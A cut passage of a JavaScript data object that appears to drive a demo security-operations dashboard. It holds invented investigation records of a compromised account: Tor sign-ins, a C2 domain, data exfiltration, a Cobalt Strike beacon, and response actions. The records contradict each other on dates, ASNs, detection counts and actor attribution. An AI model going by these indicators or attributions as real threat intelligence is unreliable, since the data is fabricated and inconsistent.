          'OAuth Apps Consented':'5 (1 suspicious: "FileSync Pro")',
          'M365 License':'E5 (Exchange, SharePoint, Teams)',
          'SharePoint Sites':'14 sites accessed (3 sensitive)',
          'OneDrive Usage':'28.4 GB / 1 TB',
          'AWS IAM':'Not linked',
          'GCP':'Not linked'
        }
      },
      identityRisk: {
        label: 'Identity Risk Assessment', expanded: false,
        kv: {
          'Password Age':'142 days (policy: 90 days) ⚠',
          'Password Strength':'Meets complexity — never rotated',
          'Group Memberships':'Domain Users, IT-Support, VPN-Users, SharePoint-Editors',
          'Privileged Groups':'None (but WriteDACL on SVC_Backup)',
          'Stale Account':'No — active daily',
          'Service Account':'No',
          'Delegated Permissions':'Mail.Read, Files.ReadWrite.All via OAuth',
          'Admin Consent Apps':'0',
          'Kerberos Tickets':'3 active TGTs',
          'Last Password Change':'2025-11-14'
        }
      },
      attackPathContext: {
        label: 'Attack Path Context', expanded: false,
        attackPath: {
          stats: { paths:5, crownJewels:1, minHops:3, severity:'Critical' },
          description: 'm.henderson has 5 viable attack paths to Domain Admins. Shortest path is 3 hops via WriteDACL abuse. 1 choke points identified — remediating them eliminates all 3 paths.',
          nodes: [
            { label:'m.henderson', color:'blue' },
            { label:'SVC Backup', color:'red' },
            { label:'Domain Admins', color:'green' }
          ],
          remediation: {
            text: 'Remove m.henderson from SVC_Backup group → Eliminates 3 Attack paths',
            playbook: 'Run Playbook'
          }
        }
      },
      geoTravelAnalysis: {
        label: 'Geo & Travel Analysis', expanded: true,
        travelMap: {
          alert: 'Impossible Travel Detected',
          locations: [
            { city:'New York, USA', ip:'10.18.1.81', time:'03 Apr 2026  14:20:05', type:'Corporate VPN', trusted: true },
            { city:'Bucharest, Romania', ip:'185.220.101.42', time:'03 Apr 2026  14:32:10', type:'Tor Exit Node', trusted: false }
          ],
          distance: '7,530 km',
          timeDelta: '12 minutes',
          requiredSpeed: '37,650 km/h (physically impossible)',
          verdict: 'Credential compromise — simultaneous sessions from incompatible locations',
          historicalLocations: ['New York, USA (daily)', 'Chicago, USA (1x in 30d)'],
          vpnHistory: 'Corporate VPN from NY office — consistent 90 days',
          newGeo: 'Bucharest — NEVER seen before for this user'
        }
      },
      networkActivity: {
        label: 'Network Activity (24h)', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:35:44', dot:'red', malicious: true,
            details: { 'Type':'DNS Query', 'Domain':'c2-update.darkoperator.net', 'Resolution':'185.220.101.99', 'Category':'Known C2 Infrastructure', 'Reputation':'Malicious (ThreatFox, AbuseIPDB)', 'Source Host':'CORP-WS-045' } },
          { time:'03 Apr 2026  15:34:12', dot:'red', malicious: true,
            details: { 'Type':'Firewall Allow', 'Destination':'185.220.101.42:443', 'Protocol':'TLS 1.2', 'Bytes Out':'4.2 MB', 'Bytes In':'128 KB', 'Duration':'2m 18s', 'Category':'Data Exfiltration Candidate' } },
          { time:'03 Apr 2026  15:30:05', dot:'orange',
            details: { 'Type':'Proxy Log', 'URL':'https://paste.ee/api/v1/submit', 'Method':'POST', 'User-Agent':'PowerShell/7.2', 'Payload Size':'862 KB', 'Category':'Data Upload (Paste Site)' } },
          { time:'03 Apr 2026  14:58:22', dot:'orange',
            details: { 'Type':'DNS Query', 'Domain':'raw.githubusercontent.com', 'Resolution':'185.199.108.133', 'Category':'Code Hosting — Script Download', 'Source Host':'CORP-WS-045' } }
        ],
        viewAllData: [
          { time:'03 Apr 2026  15:35:44', dot:'red', malicious: true,
            details: { 'Type':'DNS Query', 'Domain':'c2-update.darkoperator.net', 'Resolution':'185.220.101.99', 'Category':'Known C2 Infrastructure', 'Reputation':'Malicious (ThreatFox, AbuseIPDB)', 'Source Host':'CORP-WS-045' } },
          { time:'03 Apr 2026  15:34:12', dot:'red', malicious: true,
            details: { 'Type':'Firewall Allow', 'Destination':'185.220.101.42:443', 'Protocol':'TLS 1.2', 'Bytes Out':'4.2 MB', 'Bytes In':'128 KB', 'Duration':'2m 18s', 'Category':'Data Exfiltration Candidate' } },
          { time:'03 Apr 2026  15:30:05', dot:'orange',
            details: { 'Type':'Proxy Log', 'URL':'https://paste.ee/api/v1/submit', 'Method':'POST', 'User-Agent':'PowerShell/7.2', 'Payload Size':'862 KB', 'Category':'Data Upload (Paste Site)' } },
          { time:'03 Apr 2026  14:58:22', dot:'orange',
            details: { 'Type':'DNS Query', 'Domain':'raw.githubusercontent.com', 'Resolution':'185.199.108.133', 'Category':'Code Hosting — Script Download', 'Source Host':'CORP-WS-045' } },
          { time:'03 Apr 2026  14:32:15', dot:'red', malicious: true,
            details: { 'Type':'VPN Connection', 'Source IP':'185.220.101.42 (Tor)', 'Assigned IP':'10.18.99.14', 'Protocol':'OpenVPN', 'Duration':'48m', 'Category':'Anomalous VPN from Tor Exit' } },
          { time:'03 Apr 2026  09:15:00', dot:'green',
            details: { 'Type':'VPN Connection', 'Source IP':'72.14.201.88 (NY Office ISP)', 'Assigned IP':'10.18.1.81', 'Protocol':'IPSec', 'Duration':'5h 22m', 'Category':'Normal — Corporate VPN' } }
        ]
      },
      endpointSecurity: {
        label: 'Endpoint Security', expanded: false,
        kv: {
          'Device':'CORP-WS-045 (Windows 11 23H2)',
          'EDR Agent':'ManageEngine Endpoint Central — Active',
          'EDR Status':'⚠ Alert: Suspicious PowerShell activity',
          'Last Scan':'03 Apr 2026 12:00 — Clean',
          'Real-Time Protection':'Enabled',
          'Quarantine':'1 item — WinUpdateSvc.dll (PUA.Generic)',
          'Firewall':'Windows Defender Firewall — Enabled',
          'BitLocker':'Enabled — TPM + PIN',
          'Patch Status':'3 critical patches pending (KB5034441, KB5034123, KB5034765)',
          'USB Policy':'Block — Last violation: None',
          'Network Isolation':'Not Applied (Recommended ⚠)',
          'Vulnerability Score':'CVSS 7.8 — High (unpatched RDP CVE-2026-0178)'
        }
      },
      complianceImpact: {
        label: 'Compliance & Regulatory Impact', expanded: false,
        complianceCards: [
          { framework:'PCI-DSS v4.0', status:'At Risk', controls:['10.2.1 — Audit log access', '8.3.1 — MFA for admin access', '12.10.1 — Incident response plan'], impact:'Cardholder data environment exposed via file access anomaly' },
          { framework:'HIPAA', status:'Violation', controls:['§164.312(a)(1) — Access Control', '§164.312(b) — Audit Controls', '§164.308(a)(6) — Incident Procedures'], impact:'PHI data accessible on SharePoint site "HR-Benefits" — user accessed 3 files' },
          { framework:'SOX', status:'At Risk', controls:['Section 302 — Financial data integrity', 'Section 404 — Internal controls'], impact:'User has access to financial reporting SharePoint — access during anomalous session' },
          { framework:'GDPR Art. 33', status:'Notification Required', controls:['Art. 33 — Data breach notification (72h)', 'Art. 34 — Communication to data subjects'], impact:'EU employee PII potentially exposed — 72h notification clock started' },
          { framework:'NIST 800-53', status:'Non-Compliant', controls:['AC-2 — Account Management', 'IR-4 — Incident Handling', 'SI-4 — System Monitoring'], impact:'Account not disabled within SLA despite critical risk score' }
        ]
      },
      responseActions: {
        label: 'Response Actions', expanded: true, noCollapse: true,
        actionButtons: [
          { icon:'🔒', label:'Disable Account', desc:'Disable in AD + Entra ID', severity:'critical', action:'disableAccount' },
          { icon:'🔑', label:'Force Password Reset', desc:'Reset password & revoke tokens', severity:'high', action:'forcePasswordReset' },
          { icon:'📱', label:'Revoke MFA Sessions', desc:'Invalidate all active MFA tokens', severity:'high', action:'revokeMFA' },
          { icon:'🖥', label:'Isolate Endpoint', desc:'Network-isolate CORP-WS-045 via EDR', severity:'critical', action:'isolateEndpoint' },
          { icon:'🚫', label:'Block Tor IP', desc:'Add 185.220.101.42 to firewall deny list', severity:'medium', action:'blockIP' },
          { icon:'📋', label:'Create Incident', desc:'Escalate to ServiceDesk Plus with full context', severity:'info', action:'createIncident' },
          { icon:'🔍', label:'Full Forensic Capture', desc:'Trigger memory + disk image on endpoint', severity:'high', action:'forensicCapture' },
          { icon:'📧', label:'Notify Manager', desc:'Email j.williams with investigation summary', severity:'info', action:'notifyManager' }
        ]
      },
      threatIntelContext: {
        label: 'Threat Intelligence Context', expanded: false,
        kv: {
          'Primary IOC':'185.220.101.42 (Tor Exit Node)',
          'ThreatFox':'Associated with APT29 (Cozy Bear) infrastructure',
          'AbuseIPDB':'Confidence Score: 98% — 1,247 reports',
          'VirusTotal':'12/94 vendors flagged as malicious',
          'First Seen (Global)':'2025-11-22',
          'Associated Campaigns':'SolarStorm-2026, NightDragon',
          'ASN':'AS9009 — M247 Europe SRL (Bucharest)',
          'Reverse DNS':'tor-exit-relay.torproject.org',
          'C2 Domain Found':'c2-update.darkoperator.net — Active C2 beacon every 30s',
          'MITRE Techniques':'T1071.001 (Web Protocols), T1041 (Exfil Over C2), T1557.002 (ARP Poisoning)',
          'Related IOCs':'185.220.101.99, paste.ee, raw.githubusercontent.com/susp-loader',
          'Sandbox Result':'WinUpdateSvc.dll — Cobalt Strike beacon (SHA256: a1b2c3…)'
        }
      },
      dlpIncidents: {
        label: 'DLP Incidents', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:34:50', dot:'red', malicious: true,
            details: { 'Policy':'PII Data Transfer — External', 'Action':'Alert (not blocked)', 'File':'HR_Benefits_Q1_2026.xlsx', 'Destination':'185.220.101.42 (C2)', 'Data Types':'SSN (142), Employee IDs (89), Salary data', 'Size':'4.2 MB', 'Classification':'Confidential — HR' } },
          { time:'03 Apr 2026  15:30:10', dot:'orange',
            details: { 'Policy':'Code Upload — External Paste Site', 'Action':'Alert (not blocked)', 'File':'stdin (PowerShell output)', 'Destination':'paste.ee', 'Data Types':'System configuration, AD schema info', 'Size':'862 KB', 'Classification':'Internal — IT' } }
        ]
      },
      peerComparison: {
        label: 'Peer Group Comparison', expanded: false,
        peerData: {
          group: 'IT Support Engineers (12 members)',
          comparison: [
            { metric:'Risk Score', user:'94', peerAvg:'22', deviation:'4.3x above', flag: true },
            { metric:'Files Accessed (24h)', user:'142', peerAvg:'8', deviation:'17.8x above', flag: true },
            { metric:'Unique Source IPs (7d)', user:'3', peerAvg:'1.2', deviation:'2.5x above', flag: true },
            { metric:'Failed Logins (7d)', user:'4', peerAvg:'0.5', deviation:'8x above', flag: true },
            { metric:'Off-Hours Logins (7d)', user:'2', peerAvg:'0.1', deviation:'20x above', flag: true },
            { metric:'Avg Session Duration', user:'6h 22m', peerAvg:'7h 45m', deviation:'Within norm', flag: false },
            { metric:'MFA Challenges (7d)', user:'12', peerAvg:'3', deviation:'4x above', flag: true },
            { metric:'PowerShell Executions (24h)', user:'23', peerAvg:'2', deviation:'11.5x above', flag: true }
          ]
        }
      }
    }
  },
  'svc-azure-ad': {
    type: 'service', modalTitle: 'Service Details · Azure AD Portal',
    sections: {
      serviceDetails: {
        label: 'Service Details', expanded: true,
        kv: {
          'Service':'Azure AD Portal (Entra ID)',
          'Category':'Identity & Access Management',
          'Provider':'Microsoft',
          'Region':'Global (Multi-region)',
          'Tenant ID':'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
          'Tenant Name':'contoso.onmicrosoft.com',
          'License':'Entra ID P2',
          'Status':'Active',
          'Triggered By':'Sign-In Anomaly — Impossible Travel'
        }
      },
      configurationIssues: {
        label: 'Configuration Issues (3)', expanded: true, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  09:00:00', dot:'red', malicious: true,
            details: {
              'Issue':'Legacy Authentication Enabled',
              'Risk':'Bypasses MFA — allows POP3/IMAP basic auth',
              'Affected Users':'All tenant users',
              'Recommendation':'Block via Conditional Access policy',
              'CIS Benchmark':'5.2.2 — Block Legacy Authentication'
            } },
          { time:'03 Apr 2026  09:00:00', dot:'red',
            details: {
              'Issue':'No Break-Glass Account Configured',
              'Risk':'Lockout risk during emergency',
              'Recommendation':'Create 2 cloud-only break-glass accounts',
              'CIS Benchmark':'1.1.4 — Emergency Access Accounts'
            } },
          { time:'02 Apr 2026  14:30:00', dot:'orange',
            details: {
              'Issue':'Self-Service Password Reset — Weak Methods',
              'Risk':'SMS-based reset allows SIM swap attacks',
              'Affected':'214 users use SMS as only method',
              'Recommendation':'Require Authenticator app or FIDO2 key',
              'CIS Benchmark':'5.2.5 — MFA Registration'
            } }
        ]
      },
      conditionalAccess: {
        label: 'Conditional Access Policies', expanded: false, viewAll: true,
        timeline: [
          { time:'01 Apr 2025  10:00:00', dot:'green',
            details: { 'State':'Enabled', 'Scope':'All users', 'Conditions':'All cloud apps', 'Grant':'Require MFA', 'Exclusions':'Break-glass accounts', 'Last Modified':'2025-04-01' } },
          { time:'15 Mar 2025  09:30:00', dot:'red',
            details: { 'State':'Report-Only ⚠ (Not enforced)', 'Scope':'All users', 'Conditions':'Exchange ActiveSync, Other Clients', 'Grant':'Block', 'Impact':'Would block 142 connections/week', 'Last Modified':'2025-03-15' } },
          { time:'20 May 2025  11:15:00', dot:'green',
            details: { 'State':'Enabled', 'Scope':'All users', 'Conditions':'Sign-in risk: Medium, High', 'Grant':'Require MFA + password change', 'Exclusions':'None', 'Last Modified':'2025-05-20' } }
        ]
      },
      signInAudit: {
        label: 'Recent Sign-In Audit', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:32:10', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'IP':'185.220.101.42 (Tor)', 'Location':'Bucharest, Romania', 'App':'Azure Portal', 'MFA':'Satisfied via token (replay?)', 'Risk':'High', 'Result':'Success' } },
          { time:'03 Apr 2026  14:20:05', dot:'green',
            details: { 'User':'m.henderson', 'IP':'10.18.1.81', 'Location':'New York, USA', 'App':'Outlook Web', 'MFA':'Push notification approved', 'Risk':'None', 'Result':'Success' } },
          { time:'03 Apr 2026  13:58:22', dot:'orange',
            details: { 'User':'j.williams', 'IP':'10.18.1.55', 'Location':'New York, USA', 'App':'Azure Portal', 'MFA':'Challenged', 'Risk':'Low', 'Result':'Interrupted' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:32:00', dot:'red',
            viewOnGraph: { nodeId:'alert-impossible-travel', label:'Impossible Travel', icon:'🔔', sourceEntity:'svc-azure-ad' },
            alertProfileId: 'alert-impossible-travel',
            detailsGrid: [
              { label:'14:32:00 Impossible Travel', value:'UEBA Anomaly', tag:'Type', tagVal:'UEBA', mitre:'T1078.004 (Valid Accounts: Cloud)', source:'Azure AD', status:'Open', severity:'Critical' }
            ] },
          { time:'03 Apr 2026  14:33:15', dot:'red',
            viewOnGraph: { nodeId:'alert-oauth-token', label:'Suspicious OAuth Token', icon:'🔔', sourceEntity:'svc-azure-ad' },
            alertProfileId: 'alert-oauth-token',
            detailsGrid: [
              { label:'14:33:15 Suspicious OAuth Token', value:'Broad Scope', tag:'Type', tagVal:'Cloud Security', mitre:'T1550.001 (Application Access Token)', source:'Azure AD', status:'Open', severity:'High' }
            ] },
          { time:'03 Apr 2026  14:35:00', dot:'orange',
            viewOnGraph: { nodeId:'alert-app-consent', label:'New App Consent', icon:'🔔', sourceEntity:'svc-azure-ad' },
            alertProfileId: 'alert-app-consent',
            detailsGrid: [
              { label:'14:35:00 New App Consent — FileSync Pro', value:'Unregistered App', tag:'Type', tagVal:'App Governance', mitre:'T1098.003 (Additional Cloud Roles)', source:'Azure AD', status:'Open', severity:'Medium' }
            ] }
        ]
      },
      processes: {
        label: 'Related Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-oauth', label:'OAuth Token (FileSync Pro)', icon:'⚙', sourceEntity:'svc-azure-ad' },
            details: { 'Process Name':'OAuth Token (FileSync Pro)', 'Type':'Bearer Token', 'Grant':'Authorization Code', 'Scope':'Mail.ReadWrite, Files.ReadWrite.All', 'Status':'Active — Revocation recommended' } },
          { time:'03 Apr 2026  14:32:10', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'svc-azure-ad' },
            details: { 'Process Name':'powershell.exe', 'Context':'Triggered via AzureAD PowerShell module', 'Source IP':'185.220.101.42 (Tor)', 'User':'m.henderson', 'Status':'Running on CORP-WS-045' } }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'svc-azure-ad' },
            details: { 'Service Name':'WinUpdateSvc', 'Relationship':'Token used to deploy masquerading service', 'Host':'CORP-WS-045', 'Status':'Running — Stop recommended' } },
          { time:'03 Apr 2026  14:20:05', dot:'green',
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'svc-azure-ad' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'Authenticated via Azure AD SSO', 'Tenant':'contoso.sharepoint.com', 'Status':'Active — Access revoked for m.henderson' } }
        ]
      }
    }
  },
  'ip-tor': {
    type: 'ip', modalTitle: 'IP Details · 185.220.101.42',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 98,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Known Malicious IP',
          metrics: [
            { icon:'🌐', label:'Tor Exit Node', value:'Confirmed', color:'#dc2626' },
            { icon:'⚠', label:'Threat Feeds Flagged', value:'5', color:'#dc2626' },
            { icon:'🔗', label:'Active Connections', value:'4', color:'#ea580c' },
            { icon:'🛡', label:'AbuseIPDB Score', value:'98%', color:'#dc2626' },
            { icon:'📊', label:'VirusTotal Detections', value:'12/89', color:'#ea580c' },
            { icon:'🎯', label:'Campaign Attribution', value:'Storm-0867', color:'#dc2626' }
          ],
          firstSeen: '2025-06-04 14:32 UTC',
          lastActivity: '2025-06-04 15:37 UTC',
          investigationStatus: 'Active — Blocked at perimeter'
        }
      },
      ipDetails: {
        label: 'IP Details', expanded: true,
        kv: {
          'IP Address':'185.220.101.42',
          'Geo Location':'Bucharest, Romania 🇷🇴',
          'ASN':'AS205100 (F3 Netze e.V.)',
          'ISP':'Tor Exit Node Operator',
          'Network Type':'Tor Exit Relay',
          'Reverse DNS':'tor-exit-relay-42.example.net',
          'First Seen':'2025-06-04 14:32 UTC',
          'Last Seen':'2025-06-04 15:37 UTC',
          'Total Connections':'4',
          'Protocols':'HTTPS (443), HTTP (8080)'
        }
      },
      threatIntelligence: {
        label: 'Threat Intelligence', expanded: true, viewAll: true,
        timeline: [
          { time:'AbuseIPDB', dot:'red', malicious: true,
            details: { 'Confidence Score':'98%', 'Total Reports':'2,847', 'Categories':'SSH Brute Force, Web Attack, Tor Node', 'Last Reported':'2025-06-04', 'Whitelisted':'No' } },
          { time:'VirusTotal', dot:'red', malicious: true,
            details: { 'Detection':'12 / 89 vendors flagged', 'Community Score':'-42', 'Tags':'Tor, Anonymizer, Suspicious', 'Last Analysis':'2025-06-03' } },
          { time:'Microsoft Threat Intel', dot:'red', malicious: true,
            details: { 'Attribution':'DEV-0867 (Storm-0867)', 'Campaign':'Credential Harvest via Tor', 'Confidence':'High', 'First Attributed':'2024-11-15' } },
          { time:'CrowdStrike Falcon X', dot:'red',
            details: { 'Actor':'SCATTERED SPIDER overlap', 'Kill Chain':'C2 Communication, Exfiltration', 'Last Activity':'2025-05-28' } },
          { time:'AlienVault OTX', dot:'orange',
            details: { 'Pulses':'14', 'Tags':'Tor Exit, APT, Credential Theft', 'Last Updated':'2025-06-02' } }
        ]
      },
      relatedCampaigns: {
        label: 'Related Campaigns & IOCs', expanded: false, viewAll: true,
        timeline: [
          { time:'Campaign: Storm-0867', dot:'red', malicious: true,
            details: { 'Type':'Nation-State (Russia-aligned)', 'Targets':'Enterprise Azure AD, M365', 'TTPs':'Valid Accounts (T1078), Email Collection (T1114)', 'Active Since':'2024-08', 'Related IPs':'185.220.101.x/24 range' } },
          { time:'IOC Cluster: TOR-CRED-2025', dot:'orange',
            details: { 'Description':'Tor-based credential harvesting cluster', 'Related Domains':'c2-relay.onion.ws, staging-payload.net', 'Related Hashes':'a3f4b8c1d9e2...7f6a', 'First Observed':'2025-03-12' } }
        ]
      },
      connectionHistory: {
        label: 'Connection History', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:37:01', dot:'red', malicious: true,
            details: { 'Direction':'Outbound', 'Source':'CORP-WS-045 (PowerShell)', 'Dest Port':'443', 'Bytes Sent':'14.2 KB', 'Bytes Received':'1.8 KB', 'Duration':'12s' } },
          { time:'03 Apr 2026  15:36:45', dot:'red', malicious: true,
            details: { 'Direction':'Outbound', 'Source':'CORP-WS-045 (certutil)', 'Dest Port':'8080', 'Bytes Sent':'0.4 KB', 'Bytes Received':'842 KB (beacon.dll)', 'Duration':'3s' } },
          { time:'03 Apr 2026  14:32:10', dot:'red', malicious: true,
            details: { 'Direction':'Inbound', 'Source':'Azure AD Sign-In', 'Dest':'m.henderson@contoso.com', 'Result':'Success (MFA bypassed)', 'Risk Level':'High' } }
        ]
      },
      geoContext: {
        label: 'Geo & Network Context', expanded: false,
        kv: {
          'Country':'Romania',
          'City':'Bucharest',
          'Latitude / Longitude':'44.4268° N, 26.1025° E',
          'Timezone':'EEST (UTC+3)',
          'Hosting':'Datacenter (not residential)',
          'VPN/Proxy':'Yes — Tor Exit Node',
          'Blocklist Status':'Listed on 6 blocklists',
          'Corporate Travel':'No travel to Romania in itinerary'
        }
      },
      associatedUsers: {
        label: 'Associated Users', expanded: true,
        kv: { 'User':'m.henderson', 'Action':'Azure AD sign-in', 'Result':'Success (MFA bypassed — token replay suspected)' }
      },
      logonActivity: {
        label: 'Logon Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:32:10', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Azure Portal', 'MFA':'Satisfied via token (replay suspected)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'03 Apr 2026  14:33:45', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'SSO (token reuse)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'02 Apr 2026  22:15:33', dot:'orange',
            details: { 'User':'unknown', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Azure Portal', 'MFA':'Not reached', 'Result':'Failure — Invalid password', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } }
        ],
        viewAllData: [
          { time:'03 Apr 2026  14:32:10', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Azure Portal', 'MFA':'Satisfied via token (replay suspected)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'03 Apr 2026  14:33:45', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'SSO (token reuse)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'03 Apr 2026  15:37:01', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Outbound C2 Connection', 'Source App':'powershell.exe', 'MFA':'N/A', 'Result':'Connected — 12s', 'Risk Level':'Critical', 'Location':'Bucharest, Romania' } },
          { time:'02 Apr 2026  22:15:33', dot:'orange',
            details: { 'User':'unknown', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Azure Portal', 'MFA':'Not reached', 'Result':'Failure — Invalid password', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } },
          { time:'02 Apr 2026  18:40:11', dot:'orange',
            details: { 'User':'j.williams', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Exchange Online', 'MFA':'Not reached', 'Result':'Failure — Account locked', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } }
        ]
      }
    }
  },
  'ip-internal': {
    type: 'ip', modalTitle: 'IP Details · 10.18.1.81',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 15,
          maxScore: 100,
          severity: 'Low',
          metrics: [
            { icon:'🏢', label:'Network Zone', value:'Internal', color:'#16a34a' },
            { icon:'✓', label:'NAC Status', value:'Compliant', color:'#16a34a' },
            { icon:'🔗', label:'Unique Destinations', value:'34', color:'#0891b2' },
            { icon:'⚠', label:'Anomalous Flows', value:'2', color:'#d97706' },
            { icon:'👤', label:'Assigned User', value:'m.henderson', color:'#7c3aed' },
            { icon:'📡', label:'Traffic (24h)', value:'1.45 GB', color:'#0891b2' }
          ],
          firstSeen: '2024-03-15 09:00 UTC',
          lastActivity: '2025-06-04 14:20 UTC'
        }
      },
      ipDetails: {
        label: 'IP Details', expanded: true,
        kv: {
          'IP Address':'10.18.1.81',
          'Geo Location':'New York, USA (Corporate Office)',
          'Subnet':'10.18.1.0/24',
          'VLAN':'VLAN-120 (Marketing Floor)',
          'DHCP':'Static Assignment',
          'Last Seen':'2025-06-04 14:20 UTC',
          'Reverse DNS':'ws-mhenderson.contoso.local',
          'Network Zone':'Internal — Trusted',
          'Firewall Zone':'Zone-LAN-120',
          'NAC Status':'Compliant — 802.1X authenticated'
        }
      },
      geoContext: {
        label: 'Geo & Network Context', expanded: false,
        kv: {
          'Country':'United States',
          'City':'New York',
          'Building':'NYC HQ — 3rd Floor, Marketing',
          'Timezone':'EST (UTC-5)',
          'Network Type':'Corporate LAN (Wired)',
          'VPN/Proxy':'No',
          'Blocklist Status':'Not listed (internal)',
          'Corporate Location':'Yes ✓'
        }
      },
      associatedUsers: {
        label: 'Associated Users', expanded: true, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:20:00', dot:'green',
            details: { 'User':'m.henderson', 'Action':'Azure AD sign-in', 'Result':'Success', 'MFA':'Push approved', 'Location':'NYC Office' } },
          { time:'03 Apr 2026  10:15:22', dot:'green',
            details: { 'User':'m.henderson', 'Action':'Interactive logon', 'Result':'Success', 'Source':'CORP-WS-045' } },
          { time:'02 Apr 2026  09:05:11', dot:'green',
            details: { 'User':'m.henderson', 'Action':'Network logon', 'Result':'Success', 'Source':'File Share \\\\fs01' } }
        ]
      },
      associatedDevices: {
        label: 'Associated Devices', expanded: true,
        kv: {
          'Device':'CORP-WS-045 (Primary)',
          'MAC':'A4:5E:60:B2:14:7C',
          'Switch Port':'SW-FLOOR3-12 / Gi0/14',
          'DHCP Lease':'Static — Reserved'
        }
      },
      connectionHistory: {
        label: 'Connection History', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:20:05', dot:'green',
            details: { 'Direction':'Outbound', 'Destination':'login.microsoftonline.com', 'Port':'443', 'Protocol':'HTTPS', 'Bytes':'12 KB', 'Duration':'2s' } },
          { time:'03 Apr 2026  14:18:30', dot:'green',
            details: { 'Direction':'Outbound', 'Destination':'contoso.sharepoint.com', 'Port':'443', 'Protocol':'HTTPS', 'Bytes':'84 KB', 'Duration':'15s' } },
          { time:'03 Apr 2026  13:45:12', dot:'green',
            details: { 'Direction':'Inbound', 'Source':'10.18.1.1 (Gateway)', 'Port':'—', 'Protocol':'ARP', 'Bytes':'64 B', 'Note':'Normal ARP response' } },
          { time:'03 Apr 2026  10:15:00', dot:'green',
            details: { 'Direction':'Outbound', 'Destination':'dc01.contoso.local', 'Port':'389', 'Protocol':'LDAP', 'Bytes':'4 KB', 'Duration':'<1s' } }
        ]
      },
      trafficSummary: {
        label: 'Traffic Summary (24h)', expanded: false,
        kv: {
          'Total Flows':'1,247',
          'Unique Destinations':'34',
          'Internal Traffic':'92%',
          'External Traffic':'8% (Azure, Microsoft CDN)',
          'Bytes Sent':'248 MB',
          'Bytes Received':'1.2 GB',
          'Anomalous Flows':'2 (to Tor exit relay ⚠)',
          'Blocked Connections':'0'
        }
      },
      logonActivity: {
        label: 'Logon Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } },
          { time:'03 Apr 2026  10:15:22', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } },
          { time:'02 Apr 2026  09:05:11', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } }
        ],
        viewAllData: [
          { time:'03 Apr 2026  14:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } },
          { time:'03 Apr 2026  10:15:22', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } },
          { time:'02 Apr 2026  09:05:11', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } },
          { time:'02 Apr 2026  08:55:00', dot:'green',
